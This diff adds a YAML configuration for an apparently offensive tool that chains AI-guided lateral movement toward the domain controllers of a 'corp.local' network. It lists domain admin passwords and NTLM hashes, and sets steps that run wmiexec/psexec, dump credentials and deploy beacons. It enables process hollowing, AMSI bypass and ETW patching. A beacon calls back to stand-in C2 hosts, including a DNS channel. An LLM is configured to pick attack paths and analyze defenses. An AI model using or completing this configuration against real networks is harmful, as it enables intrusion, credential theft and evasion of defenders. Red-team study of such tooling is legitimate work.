@@ -1,0 +1,197 @@
+# Lateral Movement Chain Configuration
+# =====================================
+# Example configuration for automated lateral movement
+
+name: "Domain Takeover Chain"
+description: "Automated lateral movement chain targeting domain controllers"
+
+# Execution strategy: sequential, parallel, breadth_first, depth_first, ai_guided
+strategy: ai_guided
+
+# Global settings
+max_depth: 5
+max_concurrent: 3
+timeout: 30
+opsec_enabled: true
+ai_guided: true
+
+# Target definitions
+targets:
+  - hostname: "dc01.corp.local"
+    ip: "192.168.1.10"
+    os_type: windows
+    priority: 1
+    tags: [dc, domain_controller, high_value]
+    notes: "Primary domain controller"
+    preferred_methods: [wmiexec, psexec]
+    
+  - hostname: "dc02.corp.local"
+    ip: "192.168.1.11"
+    os_type: windows
+    priority: 1
+    tags: [dc, domain_controller, high_value, backup_dc]
+    notes: "Backup domain controller"
+    
+  - hostname: "srv-exchange.corp.local"
+    ip: "192.168.1.20"
+    os_type: windows
+    priority: 2
+    tags: [server, exchange, mail, high_value]
+    notes: "Exchange server - potential for mail access"
+    
+  - hostname: "srv-sql01.corp.local"
+    ip: "192.168.1.21"
+    os_type: windows
+    priority: 2
+    tags: [server, sql, database, high_value]
+    notes: "SQL Server - potential for sensitive data"
+    
+  - hostname: "srv-file01.corp.local"
+    ip: "192.168.1.25"
+    os_type: windows
+    priority: 3
+    tags: [server, file_server]
+    notes: "File server - may contain sensitive documents"
+    
+  - hostname: "ws-admin01.corp.local"
+    ip: "192.168.1.50"
+    os_type: windows
+    priority: 2
+    tags: [workstation, admin_workstation, it_admin]
+    notes: "IT Admin workstation - likely has cached creds"
+    
+  - hostname: "ws-dev01.corp.local"
+    ip: "192.168.1.60"
+    os_type: windows
+    priority: 4
+    tags: [workstation, developer]
+    notes: "Developer workstation"
+
+# Credential sets
+credentials:
+  - name: "domain_admin"
+    username: "administrator"
+    domain: "CORP"
+    password: "P@ssw0rd123!"
+    type: password
+    priority: 1
+    
+  - name: "local_admin"
+    username: "localadmin"
+    password: "Admin123!"
+    type: password
+    priority: 2
+    
+  - name: "svc_backup"
+    username: "svc_backup"
+    domain: "CORP"
+    nt_hash: "aad3b435b51404eeaad3b435b51404ee"
+    lm_hash: "aad3b435b51404ee"
+    type: ntlm_hash
+    priority: 1
+    
+  - name: "helpdesk"
+    username: "helpdesk"
+    domain: "CORP"
+    password: "Help2024!"
+    type: password
+    priority: 3
+
+# Chain steps - AI will optimize order if ai_guided is true
+steps:
+  # Step 1: Initial foothold - admin workstation
+  - target: "ws-admin01.corp.local"
+    methods: [wmiexec, psexec, smbexec]
+    credentials: [domain_admin, local_admin]
+    commands:
+      - "whoami /all"
+      - "ipconfig /all"
+      - "net user /domain"
+    dump_creds: true
+    deploy_beacon: true
+    evasion_profile: stealth
+    timeout: 30
+    retry_count: 2
+    
+  # Step 2: File server - look for sensitive data
+  - target: "srv-file01.corp.local"
+    methods: [wmiexec, smbexec]
+    credentials: [domain_admin]
+    commands:
+      - "dir C:\\Shares /s /b"
+    dump_creds: true
+    deploy_beacon: false
+    
+  # Step 3: SQL Server - database access
+  - target: "srv-sql01.corp.local"
+    methods: [wmiexec]
+    credentials: [domain_admin, svc_backup]
+    commands:
+      - "sqlcmd -Q \"SELECT name FROM sys.databases\""
+    dump_creds: true
+    deploy_beacon: true
+    evasion_profile: stealth
+    
+  # Step 4: Domain Controller - ultimate target
+  - target: "dc01.corp.local"
+    methods: [wmiexec, psexec]
+    credentials: [domain_admin, svc_backup]
+    commands:
+      - "whoami /all"
+      - "nltest /dclist:corp"
+      - "net group \"Domain Admins\" /domain"
+    dump_creds: true
+    deploy_beacon: true
+    evasion_profile: paranoid
+
+# Evasion settings
+evasion:
+  enabled: true
+  profile: stealth  # stealth, paranoid, aggressive
+  reflective_loader: true
+  sleep_between_jumps: 5  # seconds between lateral movements
+  
+  # Anti-detection techniques
+  techniques:
+    - name: process_hollowing
+      enabled: true
+    - name: syscall_unhooking
+      enabled: true
+    - name: amsi_bypass
+      enabled: true
+    - name: etw_patching
+      enabled: true
+
+# Beacon deployment settings
+beacon:
+  deploy: true
+  type: python  # python, go, rust
+  config:
+    c2_url: "https://c2.example.com"
+    callback_interval: 60
+    jitter: 0.2
+    encryption: aes256
+    fallback_urls:
+      - "https://backup-c2.example.com"
+      - "dns://dns-c2.example.com"
+
+# AI guidance settings
+ai:
+  enabled: true
+  model: "gpt-4"  # or local LLM
+  suggest_paths: true
+  analyze_defenses: true
+  optimize_order: true
+  
+# Logging settings
+logging:
+  level: info
+  save_loot: true
+  loot_path: "/tmp/loot"
+  
+  # Log destinations
+  destinations:
+    - type: file
+      path: "/tmp/lateral_chain.log"
+    - type: database
+      table: "chain_logs"
